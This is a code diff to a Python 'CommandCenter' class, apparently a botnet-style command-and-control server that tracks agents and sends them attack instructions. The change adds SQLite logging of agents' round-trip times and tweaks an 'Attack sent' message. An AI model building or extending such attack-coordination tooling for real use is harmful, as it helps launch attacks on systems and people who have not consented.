@@ -136,6 +136,27 @@ class CommandCenter:
                 print("No agents to update heartbeat, skipping for 15 seconds")
                 await asyncio.sleep(15) #10
 
+    def add_rrt_tuple_to_database(self, agent_ip, rtt):
+        # Get the current working directory of the database
+        conn = sqlite3.connect(fr'{self.path}\CC_DATABASE.db')
+        cursor = conn.cursor()
+
+        cursor.execute('''CREATE TABLE IF NOT EXISTS AGENT_RTT (
+        id INTEGER PRIMARY KEY,
+        agent_ip TEXT,
+        rtt REAL
+        )''')
+
+        # Insert data into the database based on a unique IP
+        cursor.execute('''INSERT INTO AGENT_RTT
+        (agent_ip, rtt) VALUES (?, ?)''',
+        (f'{agent_ip}', f'{rtt}'))
+        conn.commit()
+        # show all agent RTT tuples
+        cursor.execute("SELECT * FROM AGENT_RTT")
+        print(cursor.fetchall())
+        
+        conn.close()
 
     async def listen(self, reader, writer):
         try:
@@ -180,6 +201,7 @@ class CommandCenter:
             if "RTT" in message:
                 print("RTT message received from", addr)
                 print("RTT:", message["RTT"])
+                self.add_rrt_tuple_to_database(agent_ip=addr[0], rtt=message["RTT"])
                 break
 
             else:
@@ -221,7 +243,7 @@ class CommandCenter:
                         # close the connection
                         s.close()
                         # Print the attack message with the current time
-                        print(f"\033[1;attack sent to Command Center @ {time.ctime()}")
-                        time.sleep(15)
+                        print(f"\033[1;Attack sent to Command Center @ {time.ctime()}")
+                        
                 except Exception as e:
                     print(f"\033[1;31mERROR: Failed to send attack instructions to {i[2]}: ", e)
